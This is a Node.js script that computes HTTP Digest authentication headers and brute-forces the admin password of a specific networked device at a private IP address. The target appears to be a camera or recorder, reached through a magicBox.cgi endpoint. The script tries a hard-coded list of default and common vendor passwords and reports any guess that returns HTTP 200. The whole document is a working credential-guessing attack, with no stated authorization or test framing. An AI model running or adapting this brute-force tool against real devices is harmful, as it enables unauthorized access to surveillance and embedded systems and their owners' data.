const http = require('http');
const crypto = require('crypto');

function md5(str) {
  return crypto.createHash('md5').update(str).digest('hex');
}

function parseDigestHeader(header) {
  const params = {};
  const regex = /(\w+)="?([^",]+)"?/g;
  let match;
  while ((match = regex.exec(header)) !== null) {
    params[match[1]] = match[2];
  }
  return params;
}

function buildDigestAuth(username, password, method, uri, authHeader) {
  const p = parseDigestHeader(authHeader);
  const realm = p.realm;
  const nonce = p.nonce;
  const qop = p.qop;
  const cnonce = crypto.randomBytes(8).toString('hex');
  const nc = '00000001';

  const ha1 = md5(`${username}:${realm}:${password}`);
  const ha2 = md5(`${method}:${uri}`);
  let response;
  if (qop === 'auth' || qop === 'auth-int') {
    response = md5(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`);
  } else {
    response = md5(`${ha1}:${nonce}:${ha2}`);
  }

  let auth = `Digest username="${username}", realm="${realm}", nonce="${nonce}", uri="${uri}", response="${response}", algorithm=MD5`;
  if (p.opaque) auth += `, opaque="${p.opaque}"`;
  if (qop) auth += `, qop="${qop}", nc=${nc}, cnonce="${cnonce}"`;
  return auth;
}

const passwords = [
  'admin',
  'admin123',
  'admin@123',
  '123456',
  'admin12345',
  'TimeWatch@123',
  'T!meW@tch#123@',
  'T!meW@tch',
  'Mysql@123',
  'hik12345',
  'admin888'
];

(async () => {
  const uri = '/cgi-bin/magicBox.cgi?action=getSystemInfo';

  // 1. Initial 401 request to get header
  const authHeader = await new Promise(r => {
    http.get({ hostname: '172.25.26.241', port: 80, path: uri }, res => {
      r(res.headers['www-authenticate']);
    }).on('error', () => r(null));
  });

  if (!authHeader) {
    console.log('No auth header returned');
    process.exit(1);
  }

  console.log('Auth header:', authHeader);

  for (const pass of passwords) {
    const authVal = buildDigestAuth('admin', pass, 'GET', uri, authHeader);
    const res = await new Promise(r => {
      http.get({
        hostname: '172.25.26.241',
        port: 80,
        path: uri,
        headers: { Authorization: authVal }
      }, resp => {
        let d = '';
        resp.on('data', c => d += c);
        resp.on('end', () => r({ status: resp.statusCode, body: d.trim() }));
      }).on('error', err => r({ status: 500, body: err.message }));
    });

    console.log(`Password "${pass}": Status ${res.status} ${res.body ? '=> ' + res.body.slice(0, 80) : ''}`);
    if (res.status === 200) {
      console.log('SUCCESS! Password is:', pass);
      console.log('Full response:', res.body);
      break;
    }
  }

  process.exit(0);
})();
